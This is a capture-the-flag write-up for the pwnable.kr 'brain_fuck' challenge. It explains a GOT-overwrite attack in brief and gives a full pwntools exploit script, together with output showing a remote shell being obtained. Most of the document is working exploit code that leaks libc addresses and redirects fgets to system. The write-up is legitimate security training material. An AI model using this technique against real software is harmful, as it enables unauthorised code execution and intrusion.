---
title: pwnable brain_fuck
date: 2017-04-22 09:55:29
tags:
- got overwrite
categories:
- pwnable.kr
---

## Exploit
这题比较简单，蛋疼的是我没有开始发送一个'.'让putchar执行一次，虽然不发送也是能成功，但是在远程主机上总接受不到4个字节的数据(在本机可以，不知道为什么......)。
函数do_brainfuck几乎可以读改任何地址(权限范围内)，然后又输出了地址内容....关键一点是怎么执行system函，
其实仔细看一下也不难。
```c
memset(&v6, 0, 0x400u);
fgets(&v6, 1024, stdin);
```
<!-- more -->
这里是不是故意的啊....把memset@got覆盖为gets(attention!, not fgets)的地址，然后把fgets@got覆盖为system的地址，然后发送个'/bin/sh'。还有要顺便把putchar@got覆盖为main函数地址，因为程序必须得再次执行到memset和fgets。

## Script
```python
from pwn import *

main = 0x08048671
puts_got = 0x0804A018
memset_got = 0x0804A02C  #changing as fgets's address
fgets_got = 0x0804A010   #changing as system's address
putchar_got = 0x0804A030  #leak 
buf = 0x0804A0A0

debug = 0
if debug:
	p = process('./bf')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('pwnable.kr', 9001)
	libc = ELF('bf_libc.so')

print (buf - putchar_got)
payload = 112 * '<'   #putchar
payload += '..>.>.>.' #putchar_got + 3
payload += '<<<' + ',>,>,>,' #putchar_got + 3
payload += '<<<<<<<' #memset_got
payload += ',>,>,>,' #memset_got + 3
payload += '<<<' + '<' * (memset_got - fgets_got)
payload += ',>,>,>,'  #fgets_got+ 3
payload += '.'

#print payload

#print "[*]sending payload...."
#gdb.attach(p)
p.recvuntil("type some brainfuck instructions except [ ]\n")
p.sendline(payload)

'''calculating some address'''
p.recv(1)
r = p.recv(4)
#print len(r)
#assert len(r) == 4
putchar_addr = u32(r)
putchar_addr = putchar_addr
print "putchar_addr: " + hex(putchar_addr)
libc_addr = putchar_addr - libc.symbols['putchar']
print "libc_addr: " + hex(libc_addr)
gets_addr = libc_addr + libc.symbols['gets']
print "gets_addr: " + hex(gets_addr)
system_addr = libc_addr + libc.symbols['system']
print "system_addr: " +  hex(system_addr)

p.send(p32(main))#overwrite putchar_got
p.send(p32(gets_addr))#overwrite memset_got
p.send(p32(system_addr))#overwrite fgets_got

#gdb.attach(p)
p.recvuntil("type some brainfuck instructions except [ ]\n")
p.sendline('/bin/sh\x00')

p.interactive()
```
OK, we can get a shell by excuting the script.
```shell
w0lfzhang@w0lfzhang666:~/Desktop/pwnable$ python bf.py 
[+] Opening connection to pwnable.kr on port 9001: Done
[*] '/home/w0lfzhang/Desktop/pwnable/bf_libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*]sending payload....
putchar_addr: 0xf765ec80
libc_addr: 0xf75fe000
gets_addr: 0xf765c770
system_addr: 0xf7638920
[*] Switching to interactive mode
$ id
uid=1035(brainfuck) gid=1035(brainfuck) groups=1035(brainfuck)
$  
```
